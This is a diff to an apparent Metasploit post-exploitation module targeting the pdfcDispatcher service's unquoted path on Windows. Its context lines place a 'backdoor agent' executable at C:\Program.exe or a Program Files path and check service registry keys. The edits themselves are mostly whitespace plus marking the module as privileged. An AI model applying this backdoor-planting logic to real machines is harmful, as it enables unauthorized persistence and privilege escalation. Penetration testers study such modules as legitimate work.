@@ -134,7 +134,7 @@ class MetasploitModule < Msf::Post
                         'DisclosureDate' => 'nov 18 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'false',
+                        'Privileged'     => 'true', # requires elevated privileges
                         'Targets'        =>
                                 [
                                          # Tested againts windows 7 (32 bits) | XP SP1 (32 bits)
@@ -221,7 +221,6 @@ def ls_stage1
    shell = "Program.exe"
   end
 
-
     # check if vulnerable service (executable) exists
     if client.fs.file.exist?("#{bin_path}")
       print_warning("pdfcDispatcher service:found")
@@ -303,7 +302,6 @@ def ls_stage2
    shell = "Program.exe"
   end
 
-
     # check if backdoor.exe exist on target
     if client.fs.file.exist?("#{payload}")
       print_status("Backdoor agent: #{shell} found!")
@@ -363,8 +361,7 @@ def ls_stage3
     print_status("Checking pdfcDispatcher service settings!")
     sleep(1.0)
   end
- 
- 
+
     print_warning("Reading service hive registry keys...")
     sleep(1.0)
     # search in target regedit for service existence
@@ -488,7 +485,6 @@ def ls_stage4
     sleep(1.5)
   end
 
-
   # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
   if datastore['PDF_EXE'] == true
    payload = "%programfiles(x86)%\\PDF.exe"
@@ -497,7 +493,6 @@ def ls_stage4
    payload = "C:\\Program.exe"
    shell = "Program.exe"
   end
-
 
     # check if backdoor.exe exist in target
     if client.fs.file.exist?("#{payload}")
@@ -522,7 +517,6 @@ def ls_stage4
       print_error("BACKDOOR_AGENT: #{payload}")
       print_line("")
     end
-
 
   # error exception funtion
   rescue ::Exception => e
